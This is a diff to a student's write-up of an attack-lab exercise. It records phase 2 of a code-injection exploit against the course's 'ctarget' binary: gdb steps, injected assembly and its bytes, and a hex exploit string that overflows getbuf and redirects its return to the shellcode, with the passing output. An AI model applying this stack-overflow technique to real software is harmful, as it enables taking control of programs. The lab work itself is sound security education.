@@ -12,6 +12,7 @@
     - [2.2. Level 2](#22-level-2)
     - [Attempt Thoughts](#attempt-thoughts)
     - [Process Record](#process-record)
+    - [Level 3](#level-3)
 
 ---
 
@@ -171,10 +172,89 @@ if equal, and we did it success
 
 1. still use the bug of `getbuf`  
 2. insert some instruction to do two thing  
-    1. modify the `%rdi` by cookie  
-    2. change the ret addr with `touch2` addr
-
-0x5565d408
+    1. part1 : inserted code  
+        1. push the address of `touch2`  
+        2. set the `%rdi` wich cookie value  
+        3. use ret to call `touch2`  
+    2. part2 : fill meaningless values  
+    3. part3 : overwrite the ret addr of `getbuf`  
+        use the starting address of the inserted code  
 
 ### Process Record
+
+1. use gdb to run `ctarget` to find the the position of the stack used as buffer  
+
+    ```bash
+    gdb ctarget
+    (gdb) b getbuf
+    (gdb) r
+    (gdb) i r
+    ```
+
+    result : rsp 0x5565d408  
+    it's the top of the stack part of the buffer  
+
+2. find the address of `touch2`  
+    easy, not mentioned here  
+
+3. edit the inserted code  
+
+    1. edit phase2.s
+
+        ```asm
+        pushq $0x000000000040177c
+        movl $0x72dfe7ad, %edi
+        ret
+        ```
+
+    2. get the machine number code of the inserted code  
+
+        ```bash
+        gcc -c phase2.s
+        objdump -d phase2.o > phase2disas.asm
+        ```
+
+        get assembly code
+
+        ```asm
+        phase2.o：     文件格式 elf64-x86-64
+
+
+        Disassembly of section .text:
+
+        0000000000000000 <.text>:
+        0:	68 7c 17 40 00       	push   $0x40177c
+        5:	bf ad e7 df 72       	mov    $0x72dfe7ad,%edi
+        a:	c3                   	ret
+        ```
+
+4. edit the exploit string and  
+    use `hex2raw` to convert the hex string to raw ascii  
+
+    phase2 :  
+
+    ```txt
+    68 7c 17 40 00 /*         pushq   0x40177c            */ 
+    bf ad e7 df 72 /*               movl    0x72dfe7ad, %edi    */ 
+    c3 /*                           ret                         */ 
+    68 68 68 68 68 68 68 68 
+    68 68 68 68 68 68 68 68 
+    68 68 68 68 68 68 68 68 
+    68 68 68 68 68 /*               meaningless sled value */ 
+    08 d4 65 55 00 00 00 00 /*      overwrite original ret addr with 0x5565d408(point to inserted code) */ 
+    ```
+
+5. deploy the exploit string  
+
+6. record  
+
+    ```txt
+    Cookie: 0x72dfe7ad
+    Type string:Touch2!: You called touch2(0x72dfe7ad)
+    Valid solution for level 2 with target ctarget
+    PASS: Sent exploit string to server to be validated.
+    NICE JOB!
+    ```
+
+### Level 3
 
